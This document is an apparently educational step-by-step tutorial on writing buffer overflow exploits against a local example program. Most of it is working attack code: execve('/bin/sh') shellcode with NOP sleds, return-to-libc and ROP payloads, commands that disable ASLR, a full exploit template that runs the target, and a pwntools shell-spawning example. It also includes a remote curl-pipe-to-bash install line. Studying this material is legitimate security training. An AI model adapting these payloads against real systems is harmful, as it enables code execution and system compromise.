# Writing Exploits for Buffer Overflows

## Introduction

Writing exploits is both an art and a science. It requires understanding of:
- Assembly language and CPU architecture
- Memory layout and stack operations
- Operating system internals
- Debugging and reverse engineering
- Creative problem-solving

This guide walks through the complete process of developing buffer overflow exploits from initial analysis to working payloads.

## The Exploit Development Process

### Phase 1: Reconnaissance and Analysis

```
1. Identify vulnerability
2. Understand the target
3. Analyze protection mechanisms
4. Gather information
```

### Phase 2: Exploitation

```
5. Calculate offsets
6. Control execution flow
7. Develop payload
8. Test and refine
```

### Phase 3: Weaponization (Ethical Testing Only)

```
9. Automate exploitation
10. Handle edge cases
11. Document findings
```

## Step-by-Step Exploit Development

### Step 1: Identify the Vulnerability

**Static Analysis:**
```bash
# Search for dangerous functions
grep -r "strcpy\|gets\|sprintf\|scanf" *.c

# Use static analysis tools
cppcheck --enable=all vulnerable_program.c
flawfinder vulnerable_program.c
```

**Dynamic Analysis:**
```bash
# Run with various inputs
./program "Normal input"
./program "$(python3 -c 'print("A"*100)')"

# Watch for crashes
dmesg | tail
```

### Step 2: Understand the Target

**Analyze the binary:**
```bash
# Check file type and architecture
file vulnerable_program
# Output: ELF 32-bit LSB executable, Intel 80386...

# Check protections
checksec --file=vulnerable_program
# Or manually:
readelf -l vulnerable_program | grep GNU_STACK
readelf -d vulnerable_program | grep BIND_NOW

# Disassemble
objdump -d vulnerable_program > disassembly.txt
objdump -M intel -d vulnerable_program > disassembly_intel.txt

# List functions
nm vulnerable_program
readelf -s vulnerable_program
```

**Protection Mechanisms:**
```bash
# Check for:
# - NX/DEP (Non-executable stack)
# - ASLR (Address Space Layout Randomization)
# - Stack Canaries (SSP - Stack Smashing Protection)
# - PIE (Position Independent Executable)
# - RELRO (Relocation Read-Only)

# Example output interpretation:
# RELRO           STACK CANARY      NX            PIE
# Partial RELRO   No canary found   NX disabled   No PIE
```

### Step 3: Set Up Debugging Environment

**Disable protections for learning:**
```bash
# Disable ASLR temporarily
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Check current setting
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled
# 1 = conservative randomization
# 2 = full randomization

# Re-enable when done
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

**Set up GDB:**
```bash
# Install GDB with enhancements
sudo apt-get install gdb

# Install pwndbg (recommended)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Or GEF (alternative)
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Or PEDA (another alternative)
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

### Step 4: Find the Crash Point

**Generate large input:**
```bash
# Method 1: Python one-liner
python3 -c "print('A' * 200)" | ./vulnerable_program

# Method 2: Perl
perl -e 'print "A"x200' | ./vulnerable_program

# Method 3: Python script
python3 << EOF
with open('input.txt', 'wb') as f:
    f.write(b'A' * 200)
EOF
./vulnerable_program < input.txt
```

**Verify the crash:**
```bash
# Run in GDB
gdb ./vulnerable_program
(gdb) run < input.txt

# After crash, examine registers
(gdb) info registers

# Look for 0x41414141 ('AAAA') in EIP/RIP
# This confirms you control the instruction pointer!
```

### Step 5: Calculate the Offset

**Method 1: Pattern Generation (Metasploit)**
```bash
# Generate unique pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200

# Or use Python equivalent
python3 << EOF
def pattern_create(length):
    pattern = ""
    parts = ["ABCDEFGHIJKLMNOPQRSTUVWXYZ", "abcdefghijklmnopqrstuvwxyz", "0123456789"]
    for part1 in parts[0]:
        for part2 in parts[1]:
            for part3 in parts[2]:
                pattern += part1 + part2 + part3
                if len(pattern) >= length:
                    return pattern[:length]
    return pattern

print(pattern_create(200))
EOF

# Run with pattern
gdb ./vulnerable_program
(gdb) run < pattern.txt

# After crash, note EIP value (e.g., 0x63413363)

# Find offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413363
# Output: [*] Exact match at offset 76
```

**Method 2: Manual Binary Search**
```bash
# Start with large value
python3 -c "print('A'*50 + 'B'*4)" | ./program  # Crashes with 0x42424242?

# If not, try larger:
python3 -c "print('A'*70 + 'B'*4)" | ./program
python3 -c "print('A'*80 + 'B'*4)" | ./program

# Once you see 0x42424242 in EIP, you found the offset!
```

**Method 3: GDB Analysis**
```bash
gdb ./vulnerable_program
(gdb) break vulnerable_function
(gdb) run
(gdb) info frame

# Note the saved EIP location
# Calculate: saved_eip_location - buffer_start_location
```

### Step 6: Control EIP/RIP

**Verify control:**
```python
#!/usr/bin/env python3
import struct
import sys

offset = 76  # Replace with your calculated offset

# Create payload with controlled return address
payload = b"A" * offset
payload += struct.pack("<I", 0xdeadbeef)  # Little-endian 32-bit address

sys.stdout.buffer.write(payload)
```

**Test it:**
```bash
python3 exploit.py | ./vulnerable_program

# In GDB:
gdb ./vulnerable_program
(gdb) run < <(python3 exploit.py)
(gdb) info registers eip

# Should show: eip = 0xdeadbeef
# Success! You control EIP!
```

### Step 7: Find Target Address

**Option 1: Jump to Existing Function**
```bash
# Find function addresses
objdump -d vulnerable_program | grep "<win>"
# Example: 08048456 <win>

# Or in GDB:
gdb ./vulnerable_program
(gdb) print win
# $1 = {<text variable, no debug info>} 0x8048456 <win>
```

**Option 2: Find Buffer Address (for shellcode)**
```bash
gdb ./vulnerable_program
(gdb) break vulnerable_function
(gdb) run
(gdb) print &buffer
# $1 = (char (*)[100]) 0xbffff600

# Or examine stack:
(gdb) info frame
(gdb) x/50wx $esp
```

**Option 3: Find gadgets (for ROP)**
```bash
# Use ROPgadget
ROPgadget --binary vulnerable_program

# Use ropper
ropper --file vulnerable_program --search "pop|ret"

# Find libc base (if needed)
gdb ./vulnerable_program
(gdb) break main
(gdb) run
(gdb) print system
(gdb) print exit
(gdb) find &system, +9999999, "/bin/sh"
```

### Step 8: Build the Exploit

**Exploit Structure (Basic):**
```python
#!/usr/bin/env python3
import struct
import sys

# Configuration
offset = 76
target_address = 0x08048456  # Address of win() function

# Build payload
payload = b"A" * offset                              # Fill buffer
payload += struct.pack("<I", target_address)         # Overwrite EIP

# Write to stdout
sys.stdout.buffer.write(payload)
```

**Exploit Structure (With Shellcode):**
```python
#!/usr/bin/env python3
import struct
import sys

# Configuration
offset = 76
buffer_address = 0xbffff600

# Shellcode: execve("/bin/sh")
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)

# NOP sled (landing pad)
nop_sled = b"\x90" * 50

# Build payload
payload = nop_sled
payload += shellcode
payload += b"A" * (offset - len(payload))
payload += struct.pack("<I", buffer_address + 10)  # Jump into NOP sled

sys.stdout.buffer.write(payload)
```

**Exploit Structure (Return-to-libc):**
```python
#!/usr/bin/env python3
import struct
import sys

# Configuration
offset = 76
system_addr = 0xb7e42da0   # Address of system() in libc
exit_addr = 0xb7e369d0     # Address of exit() in libc
sh_addr = 0xb7f6a06b       # Address of "/bin/sh" in libc

# Build payload
# Stack after overflow: [system][exit]["/bin/sh"]
payload = b"A" * offset
payload += struct.pack("<I", system_addr)
payload += struct.pack("<I", exit_addr)     # Return address for system()
payload += struct.pack("<I", sh_addr)       # Argument to system()

sys.stdout.buffer.write(payload)
```

### Step 9: Test the Exploit

**Testing workflow:**
```bash
# 1. Test locally in GDB
gdb ./vulnerable_program
(gdb) run < <(python3 exploit.py)

# 2. Test outside GDB (environment differs!)
python3 exploit.py | ./vulnerable_program

# 3. Test with different inputs
python3 exploit.py | ./vulnerable_program arg1 arg2

# 4. Test with environment variables
ENV_VAR=value python3 exploit.py | ./vulnerable_program

# 5. Test interactivity (if shellcode)
(python3 exploit.py; cat) | ./vulnerable_program
```

### Step 10: Handle Common Issues

**Issue 1: Works in GDB but not outside**
```bash
# Cause: Environment variables differ
# Solution: Account for environment size difference

# Check environment in GDB:
gdb ./vulnerable_program
(gdb) show environment

# Minimize environment:
env -i ./vulnerable_program < <(python3 exploit.py)

# Or adjust offset by ~200 bytes
```

**Issue 2: Address contains null bytes**
```python
# Problem: strcpy() stops at null byte
# Solution 1: Find address without null bytes
# Solution 2: Use different vulnerability (e.g., read() instead of strcpy())
# Solution 3: Use ROP to build address on stack
```

**Issue 3: Bad characters filtered**
```python
# Identify bad characters
bad_chars = [0x00, 0x0a, 0x0d, 0x20]  # null, newline, return, space

# Test payload:
test_payload = bytes(range(256))
# Remove bad chars and see what gets through

# Solution: Encode shellcode to avoid bad chars
# Use msfvenom with -b flag:
# msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00\x0a\x0d' -f python
```

## Advanced Exploitation Techniques

### Technique 1: NOP Sleds

**Purpose**: Increase landing zone for shellcode
```python
# Without NOP sled - must hit exact address
payload = shellcode + padding + precise_address

# With NOP sled - can land anywhere in sled
payload = (b"\x90" * 100) + shellcode + padding + approximate_address
```

### Technique 2: Egg Hunting

**When shellcode is in memory but address unknown:**
```python
# Egg hunter searches memory for unique signature
egg = b"\x90\x50\xff\xd7"  # Unique marker
egghunter = b"\x31\xdb\x53\x53\x53\x53\xb0\x71..."  # Search code

payload = egghunter + padding + return_to_egghunter
# Place actual shellcode elsewhere with egg prefix
```

### Technique 3: Return-Oriented Programming (ROP)

**When stack is not executable (NX/DEP enabled):**
```python
# Find gadgets
# gadget1: pop eax; ret @ 0x080483d1
# gadget2: pop ebx; ret @ 0x080481c9
# gadget3: int 0x80 @ 0x08048420

# Build ROP chain
rop = b"A" * offset
rop += struct.pack("<I", gadget1)  # pop eax; ret
rop += struct.pack("<I", 0x0b)     # execve syscall number
rop += struct.pack("<I", gadget2)  # pop ebx; ret
rop += struct.pack("<I", sh_addr)  # "/bin/sh" address
rop += struct.pack("<I", gadget3)  # int 0x80

# This executes: execve("/bin/sh", NULL, NULL)
```

### Technique 4: ASLR Bypass

**Information Leak Approach:**
```python
# Stage 1: Leak address
# Use format string or similar to leak stack/libc address

# Stage 2: Calculate offsets
# libc_base = leaked_address - known_offset
# system = libc_base + system_offset

# Stage 3: Exploit with calculated addresses
```

**Brute Force Approach (32-bit only):**
```python
# ASLR entropy on 32-bit is limited (~2^16 for stack)
# Try exploitation repeatedly until success
while True:
    try_exploit()
    # Eventually hits correct address
```

## Exploit Template (Complete)

```python
#!/usr/bin/env python3
"""
Buffer Overflow Exploit Template
Target: vulnerable_program
Author: Your Name
Date: 2024
"""

import struct
import sys
import subprocess

# ============== Configuration ==============
TARGET = "./vulnerable_program"
OFFSET = 76  # Offset to return address

# Addresses (update these)
BUFFER_ADDR = 0xbffff600
WIN_FUNC = 0x08048456
SYSTEM_ADDR = 0xb7e42da0
SH_ADDR = 0xb7f6a06b

# Shellcode: execve("/bin/sh", NULL, NULL)
SHELLCODE = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)

# ============== Helper Functions ==============
def p32(addr):
    """Pack 32-bit address in little-endian format"""
    return struct.pack("<I", addr)

def p64(addr):
    """Pack 64-bit address in little-endian format"""
    return struct.pack("<Q", addr)

# ============== Exploit Builders ==============
def build_exploit_shellcode():
    """Build exploit with shellcode injection"""
    nop_sled = b"\x90" * 50
    payload = nop_sled + SHELLCODE
    payload += b"A" * (OFFSET - len(payload))
    payload += p32(BUFFER_ADDR + 10)
    return payload

def build_exploit_ret2func():
    """Build exploit returning to existing function"""
    payload = b"A" * OFFSET
    payload += p32(WIN_FUNC)
    return payload

def build_exploit_ret2libc():
    """Build exploit using return-to-libc"""
    payload = b"A" * OFFSET
    payload += p32(SYSTEM_ADDR)
    payload += p32(0xdeadbeef)  # Fake return address
    payload += p32(SH_ADDR)
    return payload

# ============== Main ==============
def main():
    # Choose exploit type
    exploit_type = "shellcode"  # Options: shellcode, ret2func, ret2libc
    
    if exploit_type == "shellcode":
        payload = build_exploit_shellcode()
    elif exploit_type == "ret2func":
        payload = build_exploit_ret2func()
    elif exploit_type == "ret2libc":
        payload = build_exploit_ret2libc()
    else:
        print(f"Unknown exploit type: {exploit_type}")
        return
    
    # Debug output
    print(f"[*] Exploit type: {exploit_type}")
    print(f"[*] Payload length: {len(payload)}")
    print(f"[*] Target: {TARGET}")
    
    # Write payload to file
    with open("payload.bin", "wb") as f:
        f.write(payload)
    print("[*] Payload written to payload.bin")
    
    # Execute exploit
    print("[*] Launching exploit...")
    proc = subprocess.Popen(
        [TARGET],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    stdout, stderr = proc.communicate(payload)
    
    print("[*] Output:")
    print(stdout.decode())
    if stderr:
        print("[!] Errors:")
        print(stderr.decode())

if __name__ == "__main__":
    main()
```

## Testing Checklist

Before deploying an exploit:

- [ ] Works reliably in GDB
- [ ] Works outside GDB
- [ ] Works with different arguments
- [ ] Works with different environment
- [ ] Handles bad characters
- [ ] Provides interactive shell (if applicable)
- [ ] Documented and commented
- [ ] Tested on target architecture
- [ ] Ethical testing boundaries respected

## Responsible Disclosure

If you find a real vulnerability:

1. **Do NOT exploit it maliciously**
2. **Document the vulnerability** professionally
3. **Contact the vendor/maintainer** privately
4. **Give reasonable time** for patching (90 days standard)
5. **Coordinate disclosure** timing
6. **Provide PoC** that demonstrates impact without causing harm

## Tools of the Trade

### Essential Tools
- **GDB** with pwndbg/GEF/PEDA - Debugging
- **pwntools** - Exploit development library
- **ROPgadget/ropper** - ROP chain generation
- **radare2/Ghidra** - Reverse engineering
- **checksec** - Security analysis
- **msfvenom** - Shellcode generation

### Python Libraries
```bash
pip install pwntools
pip install ropper
```

### Example with pwntools
```python
from pwn import *

context.arch = 'i386'
context.os = 'linux'

# Generate shellcode
shellcode = asm(shellcraft.sh())

# Connect to process
p = process('./vulnerable_program')

# Build and send payload
payload = b"A" * 76 + p32(0xdeadbeef)
p.sendline(payload)

# Interact
p.interactive()
```

## Further Reading

- [Exploit Development Tutorial](https://www.corelan.be/index.php/articles/)
- [Modern Binary Exploitation - RPISEC](https://github.com/RPISEC/MBE)
- [The Shellcoder's Handbook](https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook-p-9780470080238)
- [Exploit Education](https://exploit.education/)
- [LiveOverflow Binary Exploitation Series](https://www.youtube.com/c/LiveOverflow)

---

**⚠️ Legal Notice**: This guide is for educational purposes only. Only test exploits on systems you own or have explicit written permission to test. Unauthorized exploitation is illegal and unethical.

